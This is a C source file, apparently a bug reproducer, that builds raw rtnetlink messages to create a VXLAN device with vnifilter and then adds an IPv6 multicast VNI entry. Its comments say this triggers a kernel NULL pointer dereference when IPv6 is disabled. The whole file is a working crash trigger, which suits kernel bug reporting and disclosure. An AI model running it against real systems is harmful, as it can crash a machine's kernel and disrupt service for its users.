// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <arpa/inet.h>

#define BUF 8192

static int nlfd;
static unsigned int seq = 0;

static int nl_open(void)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0) { perror("socket nl"); exit(1); }
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror("bind nl"); exit(1); }
	return fd;
}

static struct nlattr *nla_put(struct nlmsghdr *nlh, int type, const void *data, int len)
{
	struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + len;
	if (len) memcpy((char *)a + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(a->nla_len);
	return a;
}

static struct nlattr *nla_nest_start(struct nlmsghdr *nlh, int type)
{
	struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	a->nla_type = type | NLA_F_NESTED;
	a->nla_len = NLA_HDRLEN;
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_HDRLEN;
	return a;
}
static void nla_nest_end(struct nlmsghdr *nlh, struct nlattr *a)
{
	a->nla_len = (char *)nlh + nlh->nlmsg_len - (char *)a;
}

static int nl_talk(struct nlmsghdr *nlh)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	char rbuf[BUF];
	struct iovec iov = { nlh, nlh->nlmsg_len };
	struct msghdr msg = { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
	nlh->nlmsg_seq = ++seq;
	nlh->nlmsg_flags |= NLM_F_ACK;
	if (sendmsg(nlfd, &msg, 0) < 0) { perror("sendmsg"); return -1; }

	iov.iov_base = rbuf; iov.iov_len = sizeof(rbuf);
	int n = recvmsg(nlfd, &msg, 0);
	if (n < 0) { perror("recvmsg"); return -1; }
	for (struct nlmsghdr *h = (struct nlmsghdr *)rbuf; NLMSG_OK(h, n); h = NLMSG_NEXT(h, n)) {
		if (h->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = NLMSG_DATA(h);
			if (e->error) {
				fprintf(stderr, "  netlink err: %s (%d)\n", strerror(-e->error), e->error);
				return e->error;
			}
			return 0;
		}
	}
	return 0;
}

static int create_vxlan(const char *name, int link_ifindex)
{
	char buf[BUF];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
	struct ifinfomsg *ifi = NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;

	nla_put(nlh, IFLA_IFNAME, name, strlen(name) + 1);

	struct nlattr *li = nla_nest_start(nlh, IFLA_LINKINFO);
	nla_put(nlh, IFLA_INFO_KIND, "vxlan", strlen("vxlan") + 1);
	struct nlattr *data = nla_nest_start(nlh, IFLA_INFO_DATA);

	__u8 one = 1;
	__u32 link = link_ifindex;
	__u16 dport = htons(4789);
	nla_put(nlh, IFLA_VXLAN_COLLECT_METADATA, &one, 1);
	nla_put(nlh, IFLA_VXLAN_VNIFILTER, &one, 1);
	nla_put(nlh, IFLA_VXLAN_LINK, &link, 4);
	nla_put(nlh, IFLA_VXLAN_PORT, &dport, 2);
	nla_put(nlh, IFLA_VXLAN_LEARNING, &(__u8){0}, 1);

	nla_nest_end(nlh, data);
	nla_nest_end(nlh, li);

	return nl_talk(nlh);
}

static int set_link_up(int ifindex, int up)
{
	char buf[BUF];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	struct ifinfomsg *ifi = NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index = ifindex;
	ifi->ifi_change = IFF_UP;
	ifi->ifi_flags = up ? IFF_UP : 0;
	return nl_talk(nlh);
}

static int get_ifindex(const char *name)
{
	return if_nametoindex(name);
}

#define VXLAN_VNIFILTER_ENTRY        1
#define VXLAN_VNIFILTER_ENTRY_START  1
#define VXLAN_VNIFILTER_ENTRY_END    2
#define VXLAN_VNIFILTER_ENTRY_GROUP  3
#define VXLAN_VNIFILTER_ENTRY_GROUP6 4

struct tunnel_msg_local {
	__u8 family;
	__u8 flags;
	__u16 reserved2;
	__u32 ifindex;
};

static int vnifilter_entry(int cmd, int vxlan_ifindex, __u32 vni, struct in6_addr *grp6)
{
	char buf[BUF];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tunnel_msg_local));
	nlh->nlmsg_type = cmd;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	struct tunnel_msg_local *tm = NLMSG_DATA(nlh);
	tm->family = AF_BRIDGE;
	tm->ifindex = vxlan_ifindex;

	struct nlattr *e = nla_nest_start(nlh, VXLAN_VNIFILTER_ENTRY);
	nla_put(nlh, VXLAN_VNIFILTER_ENTRY_START, &vni, 4);
	if (grp6)
		nla_put(nlh, VXLAN_VNIFILTER_ENTRY_GROUP6, grp6, sizeof(*grp6));
	nla_nest_end(nlh, e);

	return nl_talk(nlh);
}

int main(void)
{

	if (unshare(CLONE_NEWNET) < 0)
		perror("unshare netns (continuing in init ns)");

	nlfd = nl_open();

	int lo = get_ifindex("lo");
	if (lo == 0) lo = 1;
	set_link_up(lo, 1);

	printf("[*] creating vxlan0 (collect-metadata + vnifilter), link=lo(%d)\n", lo);
	int r = create_vxlan("vxlan0", lo);
	printf("    create_vxlan -> %d\n", r);
	if (r) { fprintf(stderr, "create failed\n"); return 1; }

	int vx = get_ifindex("vxlan0");
	printf("[*] vxlan0 ifindex = %d\n", vx);

	printf("[*] bringing vxlan0 UP (vn4_sock created, vn6_sock == NULL under ipv6.disable=1)\n");
	r = set_link_up(vx, 1);
	printf("    set_up -> %d\n", r);

	struct in6_addr g6;
	inet_pton(AF_INET6, "ff05::1", &g6);

	printf("[*] adding IPv6 multicast VNI entry (vni=100, group6=ff05::1) -> triggers vn6_sock NULL deref\n");
	printf("[*] (closing stdout now so the KASAN dmesg splat stays clean)\n");
	fflush(stdout);
	usleep(300000);

	close(1);
	close(2);

	r = vnifilter_entry(RTM_NEWTUNNEL, vx, 100, &g6);
	(void)r;

	vnifilter_entry(RTM_DELTUNNEL, vx, 100, &g6);
	set_link_up(vx, 0);
	return 0;
}
